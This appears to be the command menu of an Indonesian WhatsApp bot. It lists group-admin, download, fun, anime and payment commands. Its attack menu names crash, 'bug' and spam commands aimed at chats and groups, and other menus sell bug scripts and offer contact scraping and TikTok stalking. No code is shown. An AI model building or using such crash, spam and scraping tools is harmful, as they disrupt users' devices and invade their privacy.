‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎
⫹┈─────────────────┈⫺
*メ O W N E R M E N U メ*
⫹┈─────────────────┈⫺
     ヤ ◦ ᴀᴅᴅᴘʀᴇᴍ
     ヤ ◦ ᴅᴇʟᴘʀᴇᴍ
     ヤ ◦ ʙᴄɢᴄ
     ヤ ◦ ɪᴘʙᴏᴛ
     ヤ ◦ ʟᴇᴀᴠᴇɢᴄ
     ヤ ◦ ꜱᴇᴛʙɪᴏʙᴏᴛ
     ヤ ◦ ᴅᴇʟᴇᴛᴇᴘᴘʙᴏᴛ
     ヤ ◦ ᴅᴇʟᴄʜᴀᴛ
     ヤ ◦ ᴅᴇʟ
     ヤ ◦ ɪɴᴠɪᴛᴇ
     ヤ ◦ ʙᴄɪᴍɢ
     ヤ ◦ ʀᴇꜱᴛᴀʀᴛ
     ヤ ◦ ᴅᴇʟᴄᴀꜱᴇ
     ヤ ◦ ᴅᴇʟ
     ヤ ◦ ꜱᴇʟꜰ
     ヤ ◦ ᴀᴅᴅʟɪᴍɪᴛ
     ヤ ◦ ʀᴇꜱᴇᴛʟɪᴍɪᴛ
     ヤ ◦ ᴅᴇʟᴄᴀꜱᴇ
     ヤ ◦ ᴀᴅᴅᴄᴀꜱᴇ
     ヤ ◦ ᴘᴜʙʟɪᴄ
     ヤ ◦ ᴀᴜᴛᴏʀᴇᴀᴅ
     ヤ ◦ ᴀᴜᴛᴏʙɪᴏ
     ヤ ◦ ɢᴇᴛᴄᴀꜱᴇ
     ヤ ◦ ʀᴇᴀᴅᴄʜᴀɴɢᴇ
     ヤ ◦ ʙɪᴏᴄʜᴀɴɢᴇ
     ヤ ◦ ꜱᴇᴛᴘᴘʙᴏᴛ
     ヤ ◦ ᴜɴʙʟᴄᴏᴋ
     ヤ ◦ ʙʟᴏᴄᴋ
     ヤ ◦ ᴄʀᴇᴀᴛᴇɢᴄ
     ヤ ◦ ʟɪꜱᴛᴘᴄ
     ヤ ◦ ᴊᴏɪɴ
     ヤ ◦ ᴀᴅᴅɢᴄ
     ヤ ◦ ᴅᴇʟɢᴄ
     ヤ ◦ ᴄʟᴇᴀʀᴀʟʟ

⫹┈─────────────────┈⫺
*メ F U N M E N U メ*
⫹┈─────────────────┈⫺
     ヤ ◦ ᴄᴀɴᴛɪᴋᴄᴇᴋ
     ヤ ◦ ᴡᴀɴɢʏ
     ヤ ◦ ꜱᴀɴɢᴇᴄᴇᴋ
     ヤ ◦ ᴋᴀᴘᴀɴᴋᴀʜ
     ヤ ◦ ʀᴀᴛᴇ
     ヤ ◦ ᴊᴏᴍᴏᴋᴄᴇᴋ
     ヤ ◦ ɢᴀɴᴛᴇɴɢᴄᴇᴋ
     ヤ ◦ ᴄᴇᴋᴀꜱᴀʟᴍᴇᴍʙᴇʀ
     ヤ ◦ Qᴄ
     ヤ ◦ ᴛᴛꜱ
     ヤ ◦ ᴛɪᴋᴛᴏᴋꜱᴛᴀʟᴋ
     ヤ ◦ ᴋᴀʟᴋᴜʟᴀᴛᴏʀ
     ヤ ◦ ʀᴠᴏ
     ヤ ◦ ᴜᴘꜱᴡ
     ヤ ◦ ɢᴇᴛꜱᴡ
     ヤ ◦ ʟɪꜱᴛꜱᴡ
     ヤ ◦ ᴛᴏᴛᴀʟꜰɪᴛᴜʀᴇ
     ヤ ◦ ꜰᴇɴɢꜱʜᴜɪ
     ヤ ◦ ᴀʀᴛɪᴛᴀʀᴏᴛ
     ヤ ◦ ᴘᴏᴛᴇɴꜱɪᴘᴇɴʏᴀᴋɪᴛ
     ヤ ◦ ʀᴀᴍᴀʟᴀɴɴᴀꜱɪʙ
     ヤ ◦ ᴘᴇᴋᴇʀᴊᴀᴀɴ
     ヤ ◦ ʀᴇᴊᴇᴋɪ
     ヤ ◦ ꜱɪꜰᴀᴛᴜꜱᴀʜᴀ
     ヤ ◦ ᴊᴀᴅɪᴀɴᴘᴇʀɴɪᴋᴀʜᴀɴ
     ヤ ◦ ᴋᴇᴄᴏᴄᴏᴋᴀɴᴘᴀꜱᴀɴɢᴀɴ
     ヤ ◦ ᴋᴇᴄᴏᴄᴏᴋᴀɴᴀᴍᴀ
     ヤ ◦ ᴀʀᴛɪɴᴀᴍᴀ
     ヤ ◦ ʀᴀᴍᴀʟᴀɴᴊᴏᴅᴏʜ
     ヤ ◦ ᴀʀᴛɪᴍɪᴍᴘɪ
     ヤ ◦ ᴇᴍᴏᴊɪᴍɪx2
     ヤ ◦ ᴇᴍᴏᴊɪᴍɪx
     ヤ ◦ ᴄᴏᴜᴘʟᴇ
     ヤ ◦ ᴀᴘᴀᴋᴀʜ
     ヤ ◦ ᴀꜰᴋ
     ヤ ◦ ᴄᴇᴋᴋʜᴏᴅᴀᴍ
     ヤ ◦ ᴄᴇᴋᴋʜᴏᴅᴀᴍ2
     ヤ ◦ ᴠɪᴅɢᴀʟᴀᴜ
     ヤ ◦ ɢᴀᴄʜᴀ-ᴍᴇᴍʙᴇʀ (ᴊᴋᴛ48)
     ヤ ◦ ᴛxᴛ2ɪᴍɢ (ᴘʀᴏᴍᴘᴛ)

⫹┈─────────────────┈⫺
*メ A N T I M E N U メ*   
⫹┈─────────────────┈⫺
     ヤ ◦ ᴀɴᴛɪʙᴏᴛ
     ヤ ◦ ᴀɴᴛɪᴡᴀᴍᴇ
     ヤ ◦ ᴀɴᴛɪᴀꜱɪɴɢ
     ヤ ◦ ᴀɴᴛɪᴠɪʀᴛᴇx
     ヤ ◦ ᴀɴᴛɪʟɪɴᴋᴀʟʟ
     ヤ ◦ ᴀɴᴛɪʟɪɴᴋꜰʙ
     ヤ ◦ ᴀɴᴛɪʟɪɴᴋʏᴛ
     ヤ ◦ ᴀɴᴛɪʟɪɴᴋʏᴛᴄʜ
     ヤ ◦ ᴀɴᴛɪʟɪɴᴋɪɢ
     ヤ ◦ ᴀɴᴛɪʟɪɴᴋᴛᴇʟᴇ
     ヤ ◦ ᴀɴᴛɪʟɪɴᴋᴛɪᴋᴛᴏᴋ
     ヤ ◦ ᴀɴᴛɪʟɪɴᴋᴛᴡɪᴛᴛᴇʀ
     ヤ ◦ ᴀɴᴛɪʟɪɴᴋ

⫹┈─────────────────┈⫺     
*メ T O P U P M E N U メ*
⫹┈─────────────────┈⫺
     ヤ ◦ ᴘᴀʏᴍᴇɴᴛ
     ヤ ◦ ᴛᴏᴘᴜᴘ
     ヤ ◦ ᴘᴜʙɢ
     ヤ ◦ ᴍʟ
     ヤ ◦ ꜰꜰ

⫹┈─────────────────┈⫺
*メ D E P O S I T M E N U メ*
⫹┈─────────────────┈⫺
     ヤ ◦ ʙᴜʏꜱᴄ
     ヤ ◦ 1ɢʙꜱᴀʟᴅᴏ
     ヤ ◦ 2ɢʙꜱᴀʟᴅᴏ
     ヤ ◦ 3ɢʙꜱᴀʟᴅᴏ
     ヤ ◦ 4ɢʙꜱᴀʟᴅᴏ
     ヤ ◦ 5ɢʙꜱᴀʟᴅᴏ
     ヤ ◦ 6ɢʙꜱᴀʟᴅᴏ
     ヤ ◦ 7ɢʙꜱᴀʟᴅᴏ
     ヤ ◦ 8ɢʙꜱᴀʟᴅᴏ
     ヤ ◦ ᴜɴʟɪꜱᴀʟᴅᴏ
     ヤ ◦ ᴀᴅᴅꜱᴀʟᴅᴏ
     ヤ ◦ ᴍɪɴꜱᴀʟᴅᴏ
     ヤ ◦ ʙᴜʏʟɪᴍɪᴛ
     ヤ ◦ ʙᴜʏᴘʀᴇᴍɪᴜᴍ
     ヤ ◦ ʙᴜʏꜱᴄʜᴀɴᴀᴋᴏᴠ5
     ヤ ◦ ꜱᴀʟᴅᴏ
     ヤ ◦ ᴘᴇᴍʙᴀʏᴀʀᴀɴ
     ヤ ◦ ᴅᴀɴᴀ
     ヤ ◦ ɢᴏᴘᴀʏ
     ヤ ◦ ᴏᴠᴏ
     ヤ ◦ Qʀɪꜱ
     ヤ ◦ ᴅᴇᴘᴏ
     ヤ ◦ ꜱᴀʟᴅᴏ
     ヤ ◦ ᴛʀxɢᴀɢᴀʟ

⫹┈─────────────────┈⫺
*メ B E R I T A M E N U メ*
⫹┈─────────────────┈⫺
     ヤ ◦ ꜰᴀᴊᴀʀ
     ヤ ◦ ᴄɴɴ
     ヤ ◦ ʟᴀʏᴀʀᴋᴀᴄᴀ
     ヤ ◦ ᴄɴʙᴄ
     ヤ ◦ ᴛʀɪʙᴜɴ
     ヤ ◦ ɪɴᴅᴏᴢᴏɴᴇ
     ヤ ◦ ᴋᴏᴍᴘᴀꜱ
     ヤ ◦ ᴅᴇᴛɪᴋ
     ヤ ◦ ᴅᴀɪʟʏ
     ヤ ◦ ɪɴᴇᴡꜱ
     ヤ ◦ ᴏᴋᴇᴢᴏɴᴇ
     ヤ ◦ ꜱɪɴᴅᴏ
     ヤ ◦ ᴛᴇᴍᴘᴏ
     ヤ ◦ ᴀɴᴛᴀʀᴀ
     ヤ ◦ ᴋᴏɴᴛᴀɴ
     ヤ ◦ ᴍᴇʀᴅᴇᴋᴀ
     ヤ ◦ ᴊᴀʟᴀɴᴛɪᴋᴜꜱ-ᴍᴇᴍᴇ
     ヤ ◦ ɢᴇᴍᴘᴀ
     ヤ ◦ ᴀꜰᴋ

⫹┈─────────────────┈⫺
*メ S C R I P T M E N U メ*
⫹┈─────────────────┈⫺
     ヤ ◦ ʙᴜʏꜱᴄ1
     ヤ ◦ ʙᴜʏꜱᴄ2
     ヤ ◦ ʙᴜʏꜱᴄ3
     ヤ ◦ ʙᴜʏꜱᴄ4
     ヤ ◦ ʙᴜʏꜱᴄ5
     ヤ ◦ ʙᴜʏꜱᴄ6
     ヤ ◦ ʙᴜʏꜱᴄ7
     ヤ ◦ ʙᴜʏꜱᴄ8
     ヤ ◦ ʙᴜʏꜱᴄ9
     ヤ ◦ ʙᴜʏꜱᴄ10
     ヤ ◦ ʙᴜʏꜱᴄ11
     ヤ ◦ ʙᴜʏꜱᴄᴊᴘᴍᴠ1
     ヤ ◦ ʙᴜʏꜱᴄᴊᴘᴍᴠ3
     ヤ ◦ ʙᴜʏꜱᴄᴊᴘᴍᴠ2
     ヤ ◦ ʙᴜʏᴍᴏᴅᴜʟᴇ
     ヤ ◦ ʙᴜʏꜱᴄᴘᴜꜱʜᴋᴏɴᴛᴀᴋ
     ヤ ◦ ʙᴜʏꜱᴄʙᴜɢᴠ3
     ヤ ◦ ʙᴜʏꜱᴄᴊᴀɢᴀɢʀᴜᴘᴠ2
     ヤ ◦ ʙᴜʏꜱᴄᴘᴜꜱʜᴀᴜᴛᴏꜱᴀᴠᴇ
     ヤ ◦ ʙᴜʏꜱᴄʙᴜɢᴠ1
     ヤ ◦ ʙᴜʏꜱᴄʙᴜɢᴠ2
     ヤ ◦ ʙᴜʏꜱᴄᴘᴜꜱʜᴀᴜᴛᴏꜱᴀᴠᴇ

⫹┈─────────────────┈⫺
*メ C U C I M A T A M E N U メ*
⫹┈─────────────────┈⫺
     ヤ ◦ ᴄᴇᴄᴀɴɪɴᴅᴏ
     ヤ ◦ ᴄᴇᴄᴀɴᴄʜɪɴᴀ
     ヤ ◦ ᴄᴇᴄᴀɴʜɪᴊᴀʙᴇʀ
     ヤ ◦ ᴄᴇᴄᴀɴᴍᴀʟᴀʏꜱɪᴀ
     ヤ ◦ ᴄᴇᴄᴀɴᴠɪᴇᴛɴᴀᴍ
     ヤ ◦ ᴄᴇᴄᴀɴᴋᴏʀᴇᴀ
     ヤ ◦ ᴄᴇᴄᴀɴᴊᴇᴘᴀɴ
     ヤ ◦ ᴄᴇᴄᴀɴ

⫹┈─────────────────┈⫺
*メ O T H E R M E N U メ*
⫹┈─────────────────┈⫺
     ヤ ◦ ᴏᴡɴᴇʀ
     ヤ ◦ ʟɪꜱᴛᴘʀᴇᴍ
     ヤ ◦ ʀᴜɴᴛɪᴍᴇ
     ヤ ◦ ᴛᴏᴛᴀʟꜰɪᴛᴜʀᴇ
     ヤ ◦ ʟɪꜱᴛɢᴄ
     ヤ ◦ ᴄᴇᴋꜱɴ
     ヤ ◦ ʀᴇᴍɪɴɪ
     ヤ ◦ ʜᴅʀ
     ヤ ◦ ʜᴅᴠɪᴅᴇᴏ
     ヤ ◦ ʜᴅᴠɪᴅ
     ヤ ◦ ʟɪᴍɪᴛ
     ヤ ◦ ᴘᴇᴍʙᴀʏᴀʀᴀɴ
     ヤ ◦ ꜱᴇᴡᴀ
     ヤ ◦ ʀᴇɢɪꜱᴛᴇʀ
     ヤ ◦ ꜱᴄʀɪᴘᴛ
     ヤ ◦ ᴘɪɴ
     ヤ ◦ ᴅᴇʟ
     ヤ ◦ ɢᴄʙᴏᴛ
     ヤ ◦ ᴘʀᴏꜰɪʟᴇ
     ヤ ◦ ꜱᴛɪᴄᴋᴇʀ
     ヤ ◦ ᴄᴇᴋɢᴄ
     ヤ ◦ ɪᴅʙᴀʜᴀꜱᴀ
     ヤ ◦ ᴀꜰᴋ
     ヤ ◦ ʀᴇQᴜᴇꜱᴛ
     ヤ ◦ ʀᴇᴘᴏʀᴛʙᴜɢ

⫹┈─────────────────┈⫺
*メ A T T A C K M E N U メ*
⫹┈─────────────────┈⫺
     ヤ ◦ ᴛᴇᴍᴘ-ʙᴀɴ
     ヤ ◦ ꜱᴀɴᴛᴀɪ
     ヤ ◦ ʙᴜɢᴀʟʟ
     ヤ ◦ ɢᴀꜱᴄᴏᴋ
     ヤ ◦ ꜱᴘᴀᴍ
     ヤ ◦ ʙᴜɢᴡᴇʙᴘᴀɢᴇ
     ヤ ◦ ꜱᴀɴᴛᴇᴛ
     ヤ ◦ ʙᴜɢʟᴏᴋᴀꜱɪ
     ヤ ◦ ᴛᴀʜᴜ
     ヤ ◦ ʙᴀɴᴛᴀɪ 
     ヤ ◦ ꜱᴀɴᴛᴇᴛᴛʀᴏʟɪ 
     ヤ ◦ ꜱᴀɴᴛᴇᴛɪɴᴠɪᴛᴇ 
     ヤ ◦ ᴄʀᴀꜱʜɢᴄ 
     ヤ ◦ ᴛᴀʜᴜɢᴄ 
     ヤ ◦ ꜱᴀɴᴛᴇᴛɢᴄᴛʀᴏʟɪ 
     ヤ ◦ ʙᴜɢɪɴᴠɪᴛᴇɢᴄ 
     ヤ ◦ ꜱʟɪᴍᴇ
     ヤ ◦ ɢᴏʏᴀɴɢ
     ヤ ◦ ᴍɪx

⫹┈─────────────────┈⫺
*メ D O W N L O A D M E N U メ*
⫹┈─────────────────┈⫺
     ヤ ◦ ᴘʟᴀʏ
     ヤ ◦ ʏᴛᴍᴘ4
     ヤ ◦ ʏᴛᴍᴘ3
     ヤ ◦ sᴘᴏᴛɪғʏ
     ヤ ◦ ɪɴꜱᴛᴀɢʀᴀᴍ
     ヤ ◦ ᴛɪᴋᴛᴏᴋ
     ヤ ◦ ᴛɪᴋᴛᴏᴋᴀᴜᴅɪᴏ
     ヤ ◦ ᴍᴇᴅɪᴀꜰɪʀᴇ
     ヤ ◦ ʏᴛs
     ヤ ◦ ᴛᴛsᴇᴀʀᴄʜ
     ヤ ◦ ᴛᴛsᴇᴀʀᴄʜ2
     ヤ ◦ ᴛᴛsᴇᴀʀᴄʜ3
     ヤ ◦ ɢᴏᴏɢʟᴇ
     ヤ ◦ ᴛᴡɪᴛᴛᴇʀ
     ヤ ◦ ɢᴅʀɪᴠᴇ
     ヤ ◦ ɢɪᴛᴄʟᴏɴᴇ
     ヤ ◦ ᴘɪɴ
     ヤ ◦ ᴄᴀᴘᴄᴜᴛ
     
⫹┈─────────────────┈⫺
*メ J K T 4 8 M E N U メ*
⫹┈─────────────────┈⫺
     ヤ ◦ ᴄʜʀɪsᴛʏ-ᴊᴋᴛ48
     ヤ ◦ ᴀᴅᴇʟ-ᴊᴋᴛ48
     ヤ ◦ ɪɴᴅɪʀᴀ-ᴊᴋᴛ48
     ヤ ◦ ғʀᴇʏᴀ-ᴊᴋᴛ48
     ヤ ◦ ᴍɪᴄʜɪᴇ-ᴊᴋᴛ48
     ヤ ◦ ᴊɪᴋᴏ-ᴏꜱʜɪ
     ヤ ◦ ᴛᴇʙᴀᴋᴊᴋᴛ48

⫹┈─────────────────┈⫺
*メ A I M E N U*
⫹┈─────────────────┈⫺
     ヤ ◦ ᴀɪ
     ヤ ◦ ᴏᴘᴇɴᴀɪ
     ヤ ◦ ꜱɪᴍɪ
     ヤ ◦ ᴀᴜᴛᴏᴀɪ
     ヤ ◦ ꜱɪᴍɪꜱɪᴍɪ
     ヤ ◦ ᴛᴏᴢᴏᴍʙɪᴇ

⫹┈─────────────────┈⫺
*メ C O N V E R T M E N U メ*
⫹┈─────────────────┈⫺
     ヤ ◦ ᴛᴏᴜʀʟ
     ヤ ◦ ꜱᴛɪᴄᴋᴇʀ
     ヤ ◦ ꜱᴍᴇᴍᴇ
     ヤ ◦ ʀᴇᴍɪɴɪ
     ヤ ◦ ʜᴅʀ
     ヤ ◦ ʜᴅᴠɪᴅᴇᴏ
     ヤ ◦ ʜᴅᴠɪᴅ
     ヤ ◦ ɢᴇᴛᴘɪᴄ
     ヤ ◦ ɢᴇᴛɴᴀᴍᴇ
     ヤ ◦ Qᴄ
     ヤ ◦ ᴛᴏᴀᴜᴅɪᴏ
     ヤ ◦ ᴏʙꜰᴜꜱ
     ヤ ◦ ꜱꜱᴡᴇʙ
     ヤ ◦ ᴛᴏɪᴍɢ
     ヤ ◦ ᴛᴏᴢᴏᴍʙɪᴇ
     ヤ ◦ ʀᴇᴍᴏᴠᴇʙɢ
     ヤ ◦ ǫᴄɪᴍᴀɢᴇ

⫹┈─────────────────┈⫺
*メ G R O U P M E N U メ*
⫹┈─────────────────┈⫺
     ヤ ◦ ᴛᴀɢᴀʟʟ
     ヤ ◦ ʜɪᴅᴇᴛᴀɢ
     ヤ ◦ ᴅᴇᴍᴏᴛᴇ
     ヤ ◦ ᴘʀᴏᴍᴏᴛᴇ
     ヤ ◦ ᴀᴅᴅ
     ヤ ◦ ᴋɪᴄᴋ
     ヤ ◦ ɪɴᴠɪᴛᴇ
     ヤ ◦ ꜱᴇɴᴅʟɪɴᴋɢᴄ
     ヤ ◦ ʀᴇꜱᴇᴛʟɪɴᴋɢᴄ
     ヤ ◦ ʟɪɴᴋɢʀᴏᴜᴘ
     ヤ ◦ ᴛᴏᴛᴀɢ
     ヤ ◦ ᴀɴᴛɪʟɪɴᴋ
     ヤ ◦ ᴀɴᴛɪʙᴏᴛ
     ヤ ◦ ꜱᴇᴛᴘᴘɢʀᴏᴜᴘ
     ヤ ◦ ᴅᴇʟ
     ヤ ◦ ꜱᴇᴛɴᴀᴍᴇɢᴄ
     ヤ ◦ ᴅᴇʟᴘᴘɢᴄ
     ヤ ◦ ᴀɴᴛɪᴛᴏxɪᴄ
     ヤ ◦ ᴏᴘᴇɴᴛɪᴍᴇ
     ヤ ◦ ᴄʟᴏꜱᴇᴛɪᴍᴇ
     ヤ ◦ ᴡᴇʟᴄᴏᴍᴇ
     ヤ ◦ ᴄᴇᴋᴍᴇᴍ
     ヤ ◦ ᴛɪᴍᴇʀɢᴄ

⫹┈─────────────────┈⫺
*メ P U S H M E N U メ*
⫹┈─────────────────┈⫺
     ヤ ◦ ᴘᴜꜱʜᴀᴋᴏɴᴛᴀᴋ2
     ヤ ◦ ᴘᴜꜱʜᴋᴏɴᴛᴀᴋ
     ヤ ◦ ᴄᴇᴋɪᴅɢᴄ
     ヤ ◦ ɢᴇᴛɪᴅɢᴄ
     ヤ ◦ ꜱᴀᴠᴇᴋᴏɴᴛᴀᴋ

⫹┈─────────────────┈⫺
*メ A N O N Y M O U S M E N U メ*
⫹┈─────────────────┈⫺
     ヤ ◦ ᴍᴇɴғᴇs
     ヤ ◦ ʙᴀʟᴀsᴍᴇɴғᴇs
     ヤ ◦ ʟᴀɴᴊᴜᴛ
     ヤ ◦ sᴛᴀʀᴛ
     ヤ ◦ sᴇɴᴅᴘʀᴏғɪʟᴇ
     ヤ ◦ ᴀɴᴏɴʏᴍᴏᴜsᴄʜᴀᴛ
     ヤ ◦ ɴᴜʟɪsᴋᴀɴᴀɴ
     ヤ ◦ ɴᴜʟɪsᴋɪʀɪ
     ヤ ◦ ғᴏʟɪᴏᴋɪʀɪ
     ヤ ◦ ғᴏʟɪᴏᴋᴀɴᴀɴ
     
⫹┈─────────────────┈⫺
*メ P R I M B O N M E N U メ*
⫹┈─────────────────┈⫺
     ヤ ◦ ᴀʀᴛɪɴᴀᴍᴀ 
     ヤ ◦ ᴀʀᴛɪᴍɪᴍᴘɪ 
     ヤ ◦ ᴋᴇᴄᴏᴄᴏᴋᴀɴᴘᴀꜱᴀɴɢᴀɴ 
     ヤ ◦ ᴋᴇᴄᴏᴄᴏᴋᴀɴɴᴀᴍᴀ 
     ヤ ◦ ᴊᴀᴅɪᴀɴᴘᴇʀɴɪᴋᴀʜᴀɴ 
     ヤ ◦ ʀᴇᴊᴇᴋɪ 
     ヤ ◦ ꜱɪꜰᴀᴛᴜꜱᴀʜᴀ 
     ヤ ◦ ᴘᴇᴋᴇʀᴊᴀᴀɴ 
     ヤ ◦ ᴀʀᴛɪᴛᴀʀᴏᴛ 
     ヤ ◦ ᴘᴏᴛᴇɴꜱɪᴘᴇɴʏᴀᴋɪᴛ 
     ヤ ◦ ʀᴀᴍᴀʟᴀɴɴᴀꜱɪʙ 
     ヤ ◦ ʜᴀʀɪꜱᴀɴɢᴀʀ 
     ヤ ◦ ʜᴀʀɪʙᴀɪᴋ 
     ヤ ◦ ꜰᴇɴɢꜱʜᴜɪ 
     ヤ ◦ ɴᴀɢᴀʜᴀʀɪ
     ヤ ◦ ʜᴀʀɪɴᴀᴀꜱ 
     ヤ ◦ ᴡᴇᴛᴏɴ 
     ヤ ◦ ᴘᴇʀᴜɴᴛᴜɴɢᴀɴ 
     ヤ ◦ ᴊᴏᴅᴏʜ
     ヤ ◦ ᴄᴀʀɪᴋᴀᴡᴀɴɢᴄ
     ヤ ◦ ᴀʀᴀʜʀᴇᴊᴇᴋɪ 
     ヤ ◦ ᴄᴇᴋᴍᴇᴍᴇᴋ
     ヤ ◦ ɴᴀᴍᴀɴɪɴᴊᴀ
     ヤ ◦ ᴄᴇᴋᴋʜᴏᴅᴀᴍ
     ヤ ◦ ꜱɪꜰᴀᴛ 
     ヤ ◦ ᴋᴇʙᴇʀᴜɴᴛᴜɴɢᴀɴ 
     ヤ ◦ ᴍᴇᴍᴀɴᴄɪɴɢ 
     ヤ ◦ ᴍᴀꜱᴀꜱᴜʙᴜʀ 
     ヤ ◦ ᴢᴏᴅɪᴀᴋ 
     ヤ ◦ ꜱʜɪᴏ 

⫹┈─────────────────┈⫺
*メ A N I M E M E N U メ*
⫹┈─────────────────┈⫺
     ヤ ◦ ᴋɪʟʟ
     ヤ ◦ ᴘᴀᴛᴛ
     ヤ ◦ ʟɪᴄᴋ
     ヤ ◦ ʏᴇᴇᴛ
     ヤ ◦ ʙᴏɴᴋ
     ヤ ◦ ᴡɪɴᴋ
     ヤ ◦ ᴘᴏɴᴋ 
     ヤ ◦ ɴᴏᴍ
     ヤ ◦ ꜱʟᴀᴘ
     ヤ ◦ ꜱᴍɪʟᴇ
     ヤ ◦ ᴡᴀᴠᴇ
     ヤ ◦ ꜱᴍᴜɢ
     ヤ ◦ ᴅᴀɴᴄᴇ
     ヤ ◦ ɢʟᴏᴍᴘ
     ヤ ◦ ʜɪɢʜꜰɪᴠᴇ
     ヤ ◦ ʜᴀɴᴅʜᴏʟᴅ
     ヤ ◦ ᴀᴋɪʀᴀ
     ヤ ◦ ᴀᴋɪʏᴀᴍᴀ
     ヤ ◦ ᴀɴᴀ
     ヤ ◦ ᴀꜱᴜɴᴀ
     ヤ ◦ ᴀʏᴜᴢᴀᴡᴀ
     ヤ ◦ ʙᴏʀᴜᴛᴏ
     ヤ ◦ ᴄʜɪʜᴏ
     ヤ ◦ ᴄʜɪᴛᴏɢᴇ
     ヤ ◦ ᴄᴏꜱᴘʟᴀʏʟᴏ
     ヤ ◦ ᴄᴏꜱᴘʟᴀʏꜱᴀɢɪʀɪ 
     ヤ ◦ ᴅᴇɪᴅᴀʀᴀ
     ヤ ◦ ᴅᴏʀᴀᴇᴍᴏɴ 
     ヤ ◦ ᴇʟᴇɴᴀ
     ヤ ◦ ᴇᴍɪʟɪᴀ
     ヤ ◦ ᴇʀᴢᴀ
     ヤ ◦ ɢʀᴇᴍᴏʀʏ
     ヤ ◦ ʜᴇꜱᴛɪᴀ
     ヤ ◦ ʜɪɴᴀᴛᴀ
     ヤ ◦ ʜᴜꜱʙᴜ
     ヤ ◦ ɪɴᴏʀɪ
     ヤ ◦ ɪꜱᴜᴢᴜ
     ヤ ◦ ɪᴛᴀᴄʜɪ
     ヤ ◦ ɪᴛᴏʀɪ
     ヤ ◦ ᴋᴀɢᴀ1
     ヤ ◦ ᴋᴀɢᴜʀᴀ
     ヤ ◦ ᴋᴀᴋᴀꜱɪʜ
     ヤ ◦ ᴋᴀᴏʀɪ
     ヤ ◦ ᴋᴇɴᴇᴋɪ
     ヤ ◦ ᴋᴏᴛᴏʀɪ
     ヤ ◦ ᴋᴜʀᴜᴍɪ
     ヤ ◦ ʟᴏʟ
     ヤ ◦ ᴍᴀᴅᴀʀᴀ 
     ヤ ◦ ᴍᴇɢᴜᴍɪɴ
     ヤ ◦ ᴍɪᴋᴇʏ
     ヤ ◦ ᴍɪᴋᴜ
     ヤ ◦ ᴍɪɴᴀᴛᴏ
     ヤ ◦ ɴᴀʀᴜᴛᴏ
     ヤ ◦ ɴᴇᴋᴏ
     ヤ ◦ ɴᴇᴋᴏ2
     ヤ ◦ ɴᴇᴋᴏɴɪᴍᴇ
     ヤ ◦ ɴᴇᴢᴜᴋᴏ
     ヤ ◦ ᴏɴᴇᴘɪᴇᴄᴇ
     ヤ ◦ ᴘᴏᴋᴇᴍᴏɴ
     ヤ ◦ ʀᴀɴᴅᴏᴍɴɪᴍᴇ
     ヤ ◦ ʀᴀɴᴅᴏᴍɴɪᴍᴇ2
     ヤ ◦ ʀɪᴢᴇ 
     ヤ ◦ ꜱᴀɢɪʀɪ
     ヤ ◦ ꜱᴀᴋᴜʀᴀ
     ヤ ◦ ꜱᴀꜱᴜᴋᴇ
     ヤ ◦ ꜱʜɪɴᴀ
     ヤ ◦ ꜱʜɪɴᴋᴀ
     ヤ ◦ ꜱʜɪɴᴏᴍɪʏᴀ
     ヤ ◦ ꜱʜɪᴢᴜᴋᴀ
     ヤ ◦ ꜱʜᴏᴛᴀ
     ヤ ◦ ᴛᴇᴊɪɴᴀ
